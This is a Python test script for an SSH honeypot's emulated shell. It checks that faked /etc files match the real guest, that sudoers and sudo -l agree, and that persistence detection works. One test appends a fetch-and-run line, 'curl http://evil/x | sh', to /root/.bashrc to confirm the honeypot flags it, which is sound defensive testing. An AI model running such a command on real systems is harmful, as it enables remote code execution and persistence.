#!/usr/bin/env python3
"""Does the box's copy of a file match the box it copies?

Sweep 146. Every sweep before this asked "do two commands agree with each
other". This asks a different question, and it found a class rather than a
bug: comparing every /etc file's size against the guest showed **thirteen
under 35% of the original**.

    /etc/ssh/sshd_config     400 bytes   guest 3446
    /etc/sudoers             200         guest 1714
    /etc/bash.bashrc          56         guest 1997
    /etc/profile             186         guest  828
    /etc/nsswitch.conf       130         guest  531
    ...and eight more

The cause is structural. The emulator was built outward from what commands
need to *read*, so each file only ever got the lines some command parses.
Nobody had compared a whole file against the original. `sshd_config` is the
sharpest instance: it is what you read to check PermitRootLogin and
PasswordAuthentication, on a box that exists to be logged into over SSH.

sshd_config is deliberately NOT the guest's file byte-for-byte. The guest is
the management sshd -- `PasswordAuthentication no`, no `Port` line -- and
root/123456 demonstrably works here. Stock Debian structure, persona values.
The other four are the guest's verbatim, because their contents are stock and
their semantics already matched.

Installing them surfaced two ordering bugs that had nothing to do with file
contents:

  * /etc/sudoers was written by _seed() and then AGAIN by _seed_gaps(), and
    the later writer won -- so the real file installed by the first was
    quietly replaced by the sketch in the second. One file, two writers.
  * startup_baseline was captured straight after _seed(), while _seed_gaps()
    and the whole-file install still had writes to make. Anything written
    after that point looked like an attacker's edit, so replacing the
    sketched /etc/profile made **every clean login report persistence**. The
    baseline is now taken once the image is finished.

Run from `honeypot/`.
"""

import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

import fakeshell as fs                                          # noqa: E402

PASS, FAIL = [], []


def check(name, cond, detail=""):
    (PASS if cond else FAIL).append(name)
    if not cond:
        print("  FAIL %-54s %s" % (name, detail))


def eq(name, got, want):
    check(name, got == want, "got %r want %r" % (got, want))


def shell(user="root"):
    s = fs.Shell(fs.VFS(), user=user, peer="198.51.100.7")
    del s._err[:]
    return s


def read(s, path):
    body = s.run("cat " + path)
    del s._err[:]
    return body


# Sizes measured on the guest. sshd_config is the persona build, so its own
# size is pinned rather than the guest's 3446.
SIZES = {
    "/etc/sudoers":         1714,
    "/etc/bash.bashrc":     1997,
    "/etc/profile":          828,
    "/etc/nsswitch.conf":    531,
}


def t_the_files_are_whole_not_sketched():
    s = shell()
    for path, size in sorted(SIZES.items()):
        eq("%s is the guest's size" % path, len(read(s, path)), size)
    body = read(s, "/etc/ssh/sshd_config")
    check("sshd_config is a real file, not a stub", len(body) > 3000,
          "%d bytes" % len(body))
    # The bulk of a real sshd_config is commented defaults, and that is what
    # someone reading it expects to see.
    comments = sum(1 for l in body.splitlines() if l.strip().startswith("#"))
    check("sshd_config carries its commented defaults", comments > 70,
          "%d comment lines" % comments)


def t_sshd_config_matches_what_the_box_actually_does():
    """The file has to describe the box it is on. root logs in with a
    password here, so the file must say both are allowed -- otherwise
    reading it is a one-command contradiction."""
    s = shell()
    active = [l.strip() for l in read(s, "/etc/ssh/sshd_config").splitlines()
              if l.strip() and not l.strip().startswith("#")]
    joined = " ".join(active)
    check("Port 22", "Port 22" in joined, joined[:80])
    check("PermitRootLogin yes", "PermitRootLogin yes" in joined, joined[:80])
    check("PasswordAuthentication yes",
          "PasswordAuthentication yes" in joined, joined[:80])
    check("it is not the management sshd's file",
          "PasswordAuthentication no" not in joined)
    check("no local ClientAliveInterval", "ClientAliveInterval" not in joined)


def t_sudoers_and_sudo_l_agree():
    """Two readings of one configuration. use_pty appeared in the file when
    the sketch was replaced, so it has to appear in the command too."""
    s = shell()
    body = read(s, "/etc/sudoers")
    listed = s.run("sudo -l")
    del s._err[:]
    for directive in ("env_reset", "mail_badpass", "use_pty"):
        check("/etc/sudoers declares %s" % directive, directive in body)
        check("sudo -l reports %s" % directive, directive in listed,
              listed[:90])
    check("secure_path is the same path in both",
          fs.PATH_ROOT in body and "secure_path" in listed)


def t_a_clean_login_reports_nothing():
    """The regression the whole-file install caused, and the ordering bug it
    exposed: startup_baseline was captured mid-build, so any later write
    looked like an attacker's edit."""
    s = fs.Shell(fs.VFS(), user="root", peer="198.51.100.7")
    seen = []
    s.log = lambda **e: seen.append(e)
    del s._err[:]
    s.run_startup_files(login=True)
    persist = [e for e in seen if e.get("event") == "persistence"]
    eq("a clean login logs no persistence", persist, [])


def t_a_real_edit_is_still_reported():
    """...and the alarm still works. Over-correcting here would silence the
    thing the baseline exists for."""
    s = fs.Shell(fs.VFS(), user="root", peer="198.51.100.7")
    del s._err[:]
    s.run("echo 'curl http://evil/x | sh' >> /root/.bashrc")
    del s._err[:]
    seen = []
    s.log = lambda **e: seen.append(e)
    s.run_startup_files(login=True)
    persist = [e for e in seen if e.get("event") == "persistence"]
    check("an appended line is reported", len(persist) == 1,
          "%d events" % len(persist))
    if persist:
        check("...and names the file", persist[0].get("path") == "/root/.bashrc",
              persist[0].get("path"))
        check("...and quotes the added line",
              "curl http://evil/x" in (persist[0].get("added") or ""),
              str(persist[0].get("added"))[:60])


def t_one_file_has_one_writer():
    """/etc/sudoers was written by two seeding passes and the later one won.
    Whatever the order, the finished image must hold the real file."""
    s = shell()
    eq("sudoers survived every seeding pass", len(read(s, "/etc/sudoers")),
       1714)
    # ...and it is still root-only, which the sketch also got right.
    mode = s.run("stat -c '%a %U:%G' /etc/sudoers").strip()
    del s._err[:]
    eq("sudoers mode and owner", mode, "440 root:root")


def main():
    for name, fn in sorted(globals().items()):
        if name.startswith("t_") and callable(fn):
            try:
                fn()
            except Exception as exc:                          # noqa: BLE001
                check(name, False, "crashed: %r" % (exc,))
    print("\npassed %d, failed %d" % (len(PASS), len(FAIL)))
    if FAIL:
        print("failed: " + ", ".join(FAIL[:8]))
    return 1 if FAIL else 0


if __name__ == "__main__":
    sys.exit(main())
